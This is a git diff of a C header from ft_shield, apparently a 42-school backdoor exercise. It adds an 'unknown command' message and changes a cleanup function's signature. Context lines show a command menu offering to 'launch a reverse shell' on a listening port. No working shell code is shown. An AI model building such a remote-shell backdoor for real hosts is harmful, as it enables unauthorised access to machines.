@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/21 16:20:40 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/21 23:02:44 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,6 +33,7 @@
 # define WELCOME_TEXT				TEXT_BLUE	TEXT_BOLD "Welcome to ft_shield!\n"																TEXT_RESET
 # define HELP_TEXT					TEXT_BLUE	TEXT_BOLD "shell: launch a reverse shell\nquit: close ft_shield\nhelp: see this\n"				TEXT_RESET
 # define RVRS_SHELL_TEXT			TEXT_BLUE	TEXT_BOLD "Launching reverse shell.\n"															TEXT_RESET
+# define UNKNOWN_COMMAND_TEXT		TEXT_BLUE	TEXT_BOLD "Unknown command. (see help)\n"														TEXT_RESET
 
 # define LOWERCASE_HEXA "0123456789abcdef"
 # define SERVER_PORT 7002
@@ -59,7 +60,7 @@ typedef struct s_ctx
 }	t_ctx;
 
 int	ctx_init(t_ctx *ctx);
-int	ctx_delete(t_ctx *ctx);
+int	ctx_delete(t_ctx *ctx, bool log);
 
 void	message_hook(t_client *client, char *msg, void *ptr);
 void	connect_hook(t_client *client, void *ptr);
